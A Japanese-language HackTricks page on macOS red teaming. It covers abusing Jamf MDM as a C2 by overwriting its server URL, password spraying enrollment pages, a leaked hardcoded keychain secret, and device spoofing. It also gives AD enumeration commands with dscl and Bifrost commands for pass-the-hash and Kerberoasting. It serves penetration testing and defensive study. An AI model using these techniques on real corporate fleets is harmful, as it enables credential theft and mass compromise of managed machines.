# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}

## MDMの悪用

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

管理プラットフォームにアクセスするために**管理者資格情報を侵害**することができれば、マシンにマルウェアを配布することで**すべてのコンピュータを侵害する可能性があります**。

MacOS環境でのレッドチーミングには、MDMの動作についての理解が非常に推奨されます：

{{#ref}}
macos-mdm/
{{#endref}}

### C2としてのMDMの使用

MDMは、プロファイルのインストール、クエリ、削除、アプリケーションのインストール、ローカル管理者アカウントの作成、ファームウェアパスワードの設定、FileVaultキーの変更を行う権限を持っています...

独自のMDMを運営するには、**ベンダーによって署名されたCSRが必要**で、[**https://mdmcert.download/**](https://mdmcert.download/)で取得を試みることができます。また、Appleデバイス用の独自のMDMを運営するには、[**MicroMDM**](https://github.com/micromdm/micromdm)を使用できます。

ただし、登録されたデバイスにアプリケーションをインストールするには、開発者アカウントによって署名されている必要があります... しかし、MDM登録時に**デバイスはMDMのSSL証明書を信頼されたCAとして追加**するため、今では何でも署名できます。

デバイスをMDMに登録するには、**`mobileconfig`**ファイルをルートとしてインストールする必要があり、これは**pkg**ファイルを介して配信できます（zipで圧縮し、Safariからダウンロードすると解凍されます）。

**Mythic agent Orthrus**はこの技術を使用しています。

### JAMF PROの悪用

JAMFは**カスタムスクリプト**（システム管理者によって開発されたスクリプト）、**ネイティブペイロード**（ローカルアカウントの作成、EFIパスワードの設定、ファイル/プロセスの監視...）および**MDM**（デバイスの構成、デバイス証明書...）を実行できます。

#### JAMF自己登録

`https://<company-name>.jamfcloud.com/enroll/`のようなページにアクセスして、**自己登録が有効**かどうかを確認します。有効な場合、**アクセスするための資格情報を要求**されるかもしれません。

スクリプト[**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py)を使用してパスワードスプレー攻撃を実行できます。

さらに、適切な資格情報を見つけた後、次のフォームを使用して他のユーザー名をブルートフォース攻撃できるかもしれません：

![](<../../images/image (107).png>)

#### JAMFデバイス認証

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

**`jamf`**バイナリには、キーチェーンを開くための秘密が含まれており、発見時には**誰もが共有**していました。それは：**`jk23ucnq91jfu9aj`**です。\
さらに、jamfは**`/Library/LaunchAgents/com.jamf.management.agent.plist`**に**LaunchDaemon**として**持続**します。

#### JAMFデバイスタ takeover

**JSS**（Jamf Software Server）**URL**は、**`jamf`**が使用するもので、**`/Library/Preferences/com.jamfsoftware.jamf.plist`**にあります。\
このファイルには基本的にURLが含まれています：
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
攻撃者は、インストール時にこのファイルを**上書きする**悪意のあるパッケージ（`pkg`）をドロップし、**TyphonエージェントからのMythic C2リスナーへのURLを設定する**ことで、JAMFをC2として悪用できるようになります。
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMFなりすまし

デバイスとJMF間の**通信をなりすます**には、以下が必要です：

- デバイスの**UUID**: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- デバイス証明書を含む**JAMFキーチェーン**: `/Library/Application\ Support/Jamf/JAMF.keychain`

この情報をもとに、**盗まれた**ハードウェア**UUID**を持ち、**SIPを無効にした**VMを**作成**し、**JAMFキーチェーンをドロップ**し、Jamf**エージェントをフック**してその情報を盗みます。

#### 秘密の盗難

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

管理者がJamfを介して実行したい**カスタムスクリプト**を監視するために、`/Library/Application Support/Jamf/tmp/`の場所を監視することもできます。これらのスクリプトは**ここに配置され、実行され、削除されます**。これらのスクリプトには**資格情報が含まれている可能性があります**。

ただし、**資格情報**はこれらのスクリプトに**パラメータ**として渡される可能性があるため、`ps aux | grep -i jamf`を監視する必要があります（ルートでなくても）。

スクリプト[**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py)は、新しいファイルが追加されたり、新しいプロセス引数が追加されたりするのをリッスンできます。

### macOSリモートアクセス

また、**MacOS**の「特別な」**ネットワーク****プロトコル**についても：

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

場合によっては、**MacOSコンピュータがADに接続されている**ことがあります。このシナリオでは、慣れているようにアクティブディレクトリを**列挙**しようとするべきです。以下のページで**ヘルプ**を見つけてください：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

役立つ可能性のある**ローカルMacOSツール**は`dscl`です：
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
また、ADを自動的に列挙し、Kerberosを操作するためにMacOS用に準備されたツールがあります：

- [**Machound**](https://github.com/XMCyber/MacHound): MacHoundは、MacOSホスト上のActive Directory関係を収集および取り込むことを可能にするBloodhound監査ツールの拡張です。
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrostは、macOS上のHeimdal krb5 APIと対話するために設計されたObjective-Cプロジェクトです。このプロジェクトの目標は、ターゲットに他のフレームワークやパッケージを必要とせずに、ネイティブAPIを使用してmacOSデバイス上のKerberosに関するセキュリティテストを向上させることです。
- [**Orchard**](https://github.com/its-a-feature/Orchard): Active Directory列挙を行うためのJavaScript for Automation (JXA)ツールです。

### ドメイン情報
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### ユーザー

MacOSのユーザーには3種類があります：

- **ローカルユーザー** — ローカルOpenDirectoryサービスによって管理され、Active Directoryとは一切接続されていません。
- **ネットワークユーザー** — DCサーバーに接続して認証を受ける必要がある揮発性のActive Directoryユーザーです。
- **モバイルユーザー** — 認証情報とファイルのローカルバックアップを持つActive Directoryユーザーです。

ユーザーとグループに関するローカル情報は、フォルダー _/var/db/dslocal/nodes/Default._ に保存されています。\
例えば、_mark_ というユーザーに関する情報は _/var/db/dslocal/nodes/Default/users/mark.plist_ に保存されており、_admin_ グループに関する情報は _/var/db/dslocal/nodes/Default/groups/admin.plist_ にあります。

HasSessionおよびAdminToエッジを使用することに加えて、**MacHoundはBloodhoundデータベースに3つの新しいエッジを追加します**：

- **CanSSH** - ホストにSSH接続を許可されたエンティティ
- **CanVNC** - ホストにVNC接続を許可されたエンティティ
- **CanAE** - ホスト上でAppleEventスクリプトを実行することを許可されたエンティティ
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
[https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ パスワード

次の方法でパスワードを取得します:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
**`Computer$`** パスワードにシステムキーチェーン内でアクセスすることが可能です。

### Over-Pass-The-Hash

特定のユーザーとサービスのためにTGTを取得します：
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
TGTが収集されると、次のコマンドで現在のセッションに注入することができます:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
取得したサービスチケットを使用して、他のコンピュータの共有にアクセスしようとすることが可能です：
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## キーチェーンへのアクセス

キーチェーンには、プロンプトを生成せずにアクセスされた場合、レッドチーム演習を進めるのに役立つ可能性のある機密情報が含まれている可能性が高いです：

{{#ref}}
macos-keychain.md
{{#endref}}

## 外部サービス

MacOSのレッドチーミングは、通常**MacOSがいくつかの外部プラットフォームと直接統合されている**ため、通常のWindowsレッドチーミングとは異なります。MacOSの一般的な構成は、**OneLoginで同期された資格情報を使用してコンピュータにアクセスし、OneLoginを介していくつかの外部サービス**（github、awsなど）にアクセスすることです。

## その他のレッドチーム技術

### Safari

Safariでファイルがダウンロードされると、それが「安全な」ファイルであれば、**自動的に開かれます**。例えば、**zipファイルをダウンロード**すると、自動的に解凍されます：

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## 参考文献

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
